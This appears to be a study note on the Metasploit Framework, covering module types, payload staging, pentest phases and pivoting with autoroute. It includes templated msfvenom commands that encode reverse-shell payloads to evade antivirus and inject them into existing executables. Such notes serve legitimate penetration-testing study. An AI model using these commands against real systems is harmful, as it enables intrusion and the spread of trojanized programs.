# The Metasploit Framework

## Mestaploit Architechture

- **Exploit**: Module to exploit a vulnerabilty and usually paired to a payload.
- **Payload**: Code used after exploiting a vulnerability to deliver a command and control.
- **Encoders**: Used to encode payloads to avoid AV detections
- **NOPS**: Ensure the stability and consistency of a payload
- **Auxiliary**: Module that performs additional functionalities as port scanning and enumeration.

### Payloads Types

- **Non-Staged**: the payload is sent in one part.
- **Staged payload**: the payload delivery is done in two phases, the first payload sent stablishes a reverse connection (*stager*), the second payload is downloaded by the stager payload and executes the downloaded payload (*stage*).

### Using Mestasploit in Pentesting

| Pentesting Phase      | Metaseploit Implementation    |
|-----------------------|-------------------------------|
| Information Gathering | Auxiliary Modules             |
| Vulnerabilty Scanning | Auxiliary Modules             |
| Exploitation          | Exploit Modules & Payloads    |
| Post Exploitation     | Meterpreter                   |
| Privilege Escalation  | PostExplotation & Meterpreter |
| Persistence           | PostExplotation & Persistence |

## Using metasploit for port scanning

- `scanner/portscan/tcp` same as nmap but scanning with metasploit it can be combined with meterpreter. `autoroute` module can be comined for pivot to another devices by scanning each ports the same utility can be done with `Proxychains` or `ReGeorg`, `run autoroute -s <other_net_IP>`.

## Encoding Payloads

`msfvenom -p <payload> LHOST=<attacker_ip> LPORT=<open_port> -e <enconder> -f <output_format> -i <encoding_iterations> > <output_name>`

## PE Payload Injection

`msfvenom -p <payload> LHOST=<attacker_ip> LPORT=<open_port> -e <enconder> -x <executable_to_inject> -f <output_format> -i <encoding_iterations> -k > <output_name>`

## Automating Metasploit With Resource Scripts

To develop an automation its necesary to specify in a file what commands are going to be used for then launch it by executing `msfconsole -r <resource_script>`
